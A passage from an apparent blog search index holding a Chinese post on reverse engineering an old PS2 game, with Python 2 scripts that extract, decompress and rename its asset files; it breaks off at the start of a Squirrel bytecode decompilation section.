<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>某上古 PS2 游戏逆向（五）游戏资源提取</title>
      <link href="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏资源提取与解压"><a href="# 游戏资源提取与解压" class="headerlink" title="游戏资源提取与解压"></a>游戏资源提取与解压 </h1><p> 最终 <a href="https://srpopty.github.io/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/"> 前文 </a> 的逆向结果，与前面三篇文章中的文件提取脚本，重新写一个游戏文件解压脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: extract_hd_bin.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Extract files from .HD and .BIN file.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2short</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) == <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress_chunk</span>(<span class="params">data, size, step</span>):</span><br><span class="line">    <span class="comment"># FUN_00116348</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    j = size / step</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> step != <span class="number">0</span></span><br><span class="line">    k = j * step</span><br><span class="line">    <span class="keyword">if</span> j &gt; <span class="number">0</span>:</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">while</span> pos &lt; k:</span><br><span class="line">                result += data[pos]</span><br><span class="line">                pos += j</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= j:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            pos = i</span><br><span class="line">    <span class="keyword">while</span> k &lt; size:</span><br><span class="line">        result += data[k]</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress_data</span>(<span class="params">data, size, step</span>):</span><br><span class="line">    <span class="comment"># FUN_00116048</span></span><br><span class="line">    raw_size = size</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    queue = [</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="string">&quot;\x00&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_queue</span>(<span class="params">lv, ele</span>):</span><br><span class="line">        <span class="keyword">if</span> lv &gt;= <span class="number">5</span>:</span><br><span class="line">            queue[<span class="number">5</span>] = queue[<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> lv &gt;= <span class="number">4</span>:</span><br><span class="line">            queue[<span class="number">4</span>] = queue[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> lv &gt;= <span class="number">3</span>:</span><br><span class="line">            queue[<span class="number">3</span>] = queue[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> lv &gt;= <span class="number">2</span>:</span><br><span class="line">            queue[<span class="number">2</span>] = queue[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> lv &gt;= <span class="number">1</span>:</span><br><span class="line">            queue[<span class="number">1</span>] = queue[<span class="number">0</span>]</span><br><span class="line">        queue[<span class="number">0</span>] = ele</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> size &gt; <span class="number">0</span>:</span><br><span class="line">        instruction = <span class="built_in">ord</span>(data[pos])</span><br><span class="line">        command = instruction &gt;&gt; <span class="number">5</span></span><br><span class="line">        length = instruction &amp; <span class="number">0x1F</span></span><br><span class="line">        <span class="comment"># print(hex(pos), hex(instruction), command, length)</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> command == <span class="number">6</span>:</span><br><span class="line">            char = data[pos]</span><br><span class="line">            update_queue(command, [command, char])</span><br><span class="line">            result += char * (length + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            size -= length + <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">7</span>:</span><br><span class="line">            sub_data = data[pos : pos + length + <span class="number">1</span>]</span><br><span class="line">            update_queue(command, [command, sub_data])</span><br><span class="line">            result += sub_data</span><br><span class="line"></span><br><span class="line">            pos += length + <span class="number">1</span></span><br><span class="line">            size -= length + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ref = queue[command]</span><br><span class="line">            update_queue(command, ref)</span><br><span class="line">            <span class="keyword">if</span> ref[<span class="number">0</span>] == <span class="number">6</span>:</span><br><span class="line">                result += ref[<span class="number">1</span>] * (length + <span class="number">2</span>)</span><br><span class="line">                size -= length + <span class="number">2</span></span><br><span class="line">            <span class="keyword">elif</span> ref[<span class="number">0</span>] == <span class="number">7</span>:</span><br><span class="line">                dp = length &gt;&gt; <span class="number">2</span></span><br><span class="line">                dl = length &amp; <span class="number">3</span></span><br><span class="line">                <span class="comment"># dl = instruction &amp; 3</span></span><br><span class="line">                result += ref[<span class="number">1</span>][dp : dp + dl + <span class="number">1</span>]</span><br><span class="line">                size -= dl + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> decompress_chunk(result, raw_size, step)</span><br><span class="line">    <span class="keyword">return</span> decompress_chunk(result, raw_size, step)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">i, data, file_size, output_dir, compressed, is_voice, is_sound</span>):</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> compressed:</span><br><span class="line">        data = decompress_data(</span><br><span class="line">            data, size=hex2short(data[:<span class="number">4</span>]), step=hex2short(data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data[:<span class="number">4</span>] == <span class="string">&quot;TIM2&quot;</span>:</span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.tm2&quot;</span> % i)</span><br><span class="line">    <span class="keyword">elif</span> data[:<span class="number">2</span>] == <span class="string">&quot;BM&quot;</span>:  <span class="comment"># and hex2short(data[10:14]) == 0x76:</span></span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.bmp&quot;</span> % i)</span><br><span class="line">    <span class="keyword">elif</span> data[<span class="number">0</span>:<span class="number">1</span>] == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.lst&quot;</span> % i)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data) &gt; <span class="number">4</span> <span class="keyword">and</span> hex2short(data[:<span class="number">4</span>]) == <span class="number">0x4952FAFA</span>:</span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.cnut&quot;</span> % i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.dat&quot;</span> % i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">if</span> is_voice <span class="keyword">or</span> is_sound:</span><br><span class="line">            data = (</span><br><span class="line">                <span class="string">b&quot;\x56\x41\x47\x70&quot;</span></span><br><span class="line">                + <span class="string">b&quot;\x00\x00\x00\x06&quot;</span></span><br><span class="line">                + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">                + struct.pack(<span class="string">&quot;&gt;I&quot;</span>, file_size)</span><br><span class="line">                + <span class="string">b&quot;\x00\x00\x56\x22&quot;</span></span><br><span class="line">                + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                + (<span class="string">&quot;%s&quot;</span> % i).encode().ljust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">                + data</span><br><span class="line">            )</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_voice <span class="keyword">or</span> is_sound:</span><br><span class="line">        tmp_name = filename</span><br><span class="line">        filename = os.path.join(output_dir, <span class="string">&quot;%05d.wav&quot;</span> % i)</span><br><span class="line">        os.system(<span class="string">&quot;ffmpeg -i &#x27;%s&#x27; &#x27;%s&#x27;&quot;</span> % (tmp_name, filename))</span><br><span class="line">        os.remove(tmp_name)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    Extracted: %s&quot;</span> % filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">hd_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(hd_filename):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s does not exists.&quot;</span> % hd_filename)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    pool = Pool(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    prefix = <span class="string">&quot;.&quot;</span>.join(hd_filename.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    compressed = (</span><br><span class="line">        prefix.endswith(<span class="string">&quot;NORMAL&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> prefix.endswith(<span class="string">&quot;SCENE_ID&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> prefix.endswith(<span class="string">&quot;SCENEDAT&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># compressed = False</span></span><br><span class="line">    is_voice = prefix.endswith(<span class="string">&quot;VOICE_ID&quot;</span>)</span><br><span class="line">    is_sound = prefix.endswith(<span class="string">&quot;SOUND_ID&quot;</span>)</span><br><span class="line"></span><br><span class="line">    output_dir = prefix</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.mkdir(output_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Extracting &quot;%s&quot; to &quot;%s&quot;...&#x27;</span> % (prefix, output_dir))</span><br><span class="line"></span><br><span class="line">    head_filename = prefix + <span class="string">&quot;.HD&quot;</span></span><br><span class="line">    head_size = os.path.getsize(head_filename)</span><br><span class="line">    head_file = <span class="built_in">open</span>(head_filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    bin_filename = prefix + <span class="string">&quot;.BIN&quot;</span></span><br><span class="line">    bin_size = os.path.getsize(bin_filename)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(bin_filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> head_size % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  Invalid head file size: &quot;</span> + <span class="built_in">hex</span>(head_size))</span><br><span class="line">        head_file.close()</span><br><span class="line">        bin_file.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Head file size: &quot;</span> + <span class="built_in">hex</span>(head_size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Bin file size: &quot;</span> + <span class="built_in">hex</span>(bin_size))</span><br><span class="line"></span><br><span class="line">    file_count = head_size &gt;&gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  Total %d files to be extracted.&quot;</span> % file_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(file_count):</span><br><span class="line">        file_size = hex2short(head_file.read(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file_size:</span><br><span class="line">            data = bin_file.read(file_size)</span><br><span class="line">            j = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> j * <span class="number">0x800</span> &gt;= bin_file.tell():</span><br><span class="line">                    s = bin_file.read(j * <span class="number">0x800</span> - bin_file.tell())</span><br><span class="line">                    <span class="keyword">assert</span> <span class="built_in">len</span>(s.replace(<span class="string">b&quot;\xff&quot;</span>, <span class="string">b&quot;&quot;</span>)) == <span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        pool.apply_async(</span><br><span class="line">            decompress,</span><br><span class="line">            args=(i, data, file_size, output_dir, compressed, is_voice, is_sound),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    head_file.close()</span><br><span class="line">    bin_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><code>extract_hd_bin.py</code> 结合了前面三篇文章中所有的提取与转换脚本，仅需要提供 <code>.HD</code> 文件的路径就可以自动提取、解压、识别、转换文件。</p><p>仅在 python2 下运行，支持多进程（6 进程，可修改），例如 <code>python2 extract_hd_bin.py ./xxxxx/NORMAL.HD</code>，该脚本会自动将 <code>./xxxxx/NORMAL.BIN</code> 的文件提取至 <code>/xxxxx/NORMAL/</code> 目录下，以文件出现顺序作为文件名，例如 <code>00000.dat</code>。</p><p>通过分析可以发现，仅 <code>NORMAL</code>、 <code>SCENE_ID</code> 和  <code>SCENE_DAT</code> 中的文件被压缩，其余 3 个 <code>.BIN</code> 未被压缩，<code>SOUND_ID</code>、<code>VOICE_ID</code> 中仍然保存的音频 ADPCM 裸数据，<code>SYSTEM</code> 中保存明文。</p><p>脚本支持识别 <code>.cnut</code>、<code>.bmp</code> 以及 <code>.tm2</code> 文件，未被识别出的文件类型以 <code>.dat</code> 结尾。识别出的 ADPCM 将自动拼接 VAG 文件头并且用 ffmpeg 转换为 wav 文件，需要命令行存在 ffmpeg 命令。</p><p>对于 <code>.tm2</code> 图片文件，推荐使用 <a href="https://www.xnview.com/en/xnconvert/">XnConvert</a> 批量转换为 PNG 文件。</p><h1 id="文件名称与路径恢复"><a href="# 文件名称与路径恢复" class="headerlink" title="文件名称与路径恢复"></a>文件名称与路径恢复 </h1><p> 基于 <code>NORMAL</code> 中提取的几个 <code>LST</code> 文件，使用如下脚本可以将 <code>extract_hd_bin.py</code> 提取出的文件恢复到 <code>LST</code> 中指定的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: rename.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Rename extracted files from .LST file.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">directory, name_list_file</span>):</span><br><span class="line">    name_list = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name_list_file, <span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">0</span> <span class="keyword">or</span> line[<span class="number">0</span>] == <span class="string">&quot;[&quot;</span> <span class="keyword">or</span> line.startswith(<span class="string">&quot;//&quot;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name_list.append(os.path.join(directory, line.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>)))</span><br><span class="line">    src_files = [</span><br><span class="line">        os.path.join(directory, i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(os.listdir(directory))</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^\d+\.[a-zA-Z0-9]+$&quot;</span>, i)</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(src_files) == <span class="built_in">len</span>(name_list), <span class="string">&quot;%d != %d&quot;</span> % (</span><br><span class="line">        <span class="built_in">len</span>(src_files),</span><br><span class="line">        <span class="built_in">len</span>(name_list),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(src_files)):</span><br><span class="line">        src_file = src_files[i]</span><br><span class="line">        no = os.path.basename(src_file).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        dst_file = name_list[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> os.path.basename(dst_file):</span><br><span class="line">            dst_file = dst_file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> dst_file[-<span class="number">1</span>] <span class="keyword">in</span> (<span class="string">&quot;NUT&quot;</span>, <span class="string">&quot;nut&quot;</span>):</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(src_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">if</span> f.read(<span class="number">2</span>) == <span class="string">&quot;\xfa\xfa&quot;</span>:</span><br><span class="line">                        dst_file[-<span class="number">1</span>] = <span class="string">&quot;cnut&quot;</span></span><br><span class="line">            dst_file = <span class="string">&quot;.&quot;</span>.join(dst_file[:-<span class="number">1</span>]) + <span class="string">&quot;_&quot;</span> + no + <span class="string">&quot;.&quot;</span> + dst_file[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dst_file += <span class="string">&quot;_&quot;</span> + no</span><br><span class="line"></span><br><span class="line">        dst_dir = os.path.dirname(dst_file)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dst_dir):</span><br><span class="line">            os.makedirs(dst_dir)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rename %s -&gt; %s&quot;</span> % (src_file, dst_file))</span><br><span class="line">        os.rename(src_file, dst_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仅在 Python2 下运行，例如 <code>python2 rename.py ./xxxx/NORMAL/ ./xxxx/NORMAL/00011.lst</code> 可以恢复已经解压出的 <code>NORMAL</code> 文件名，并且文件名中携带文件原本的编号便于 debug。</p><blockquote><p>注意恢复完 NORMAL 后，如果接着恢复其他文件，则需要指定 NORMAL 中已经恢复的 LST 文件名，而不是文件编号。</p></blockquote><p><img src="/2024/02/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%94%EF%BC%89/1.jpg" alt="恢复出的 NORMAL 文件夹"></p><h1 id="Squirrel- 字节码反编译"><a href="#Squirrel- 字节码反编译" class="headerlink" title="Squirrel 字节码反编译"></a>Squirrel 字节码反编译 </h1><p> 以下脚本完善了 <a href="https://srpopty.github.io/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/"> 前文 </a> 中反编译 cnut 字节码的流程，可自动处理反编译后脚本中的 <code>shift-jis</code> 编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 